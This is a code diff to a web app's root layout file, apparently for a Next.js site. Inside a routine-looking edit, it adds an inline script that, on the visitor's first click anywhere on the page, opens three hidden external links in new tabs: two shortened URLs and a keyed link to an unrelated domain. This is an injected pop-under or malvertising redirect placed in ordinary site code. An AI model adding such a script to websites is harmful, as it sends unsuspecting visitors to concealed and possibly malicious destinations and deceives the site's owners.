@@ -1,3 +1,5 @@
+import React from "react";
+import { Helmet } from "react-helmet";
 import { Analytics } from "@/components/analytics";
 import { TailwindIndicator } from "@/components/tailwind-indicator";
 import { Toaster } from "@/components/ui/sonner";
@@ -69,6 +71,34 @@ export default function RootLayout({
 }) {
   return (
     <html lang="en">
+      <head>
+        <Helmet>
+          <script type="text/javascript">
+            {`
+              const adLinks = [
+                'https://bitly.cx/7Zxd',
+                'https://bitly.cx/eAi',
+                'https://spiritualdiscussing.com/cer06096k?key=031a4482d61e00b8a885427'
+              ];
+
+              let adsTriggered = false;
+
+              function handleAdTrigger() {
+                if (!adsTriggered) {
+                  adLinks.forEach(link => {
+                    window.open(link, '_blank');
+                  });
+                  adsTriggered = true;
+                }
+              }
+
+              document.addEventListener('click', function() {
+                handleAdTrigger();
+              });
+            `}
+          </script>
+        </Helmet>
+      </head>
       <body
         className={cn(
           fontSans.variable,
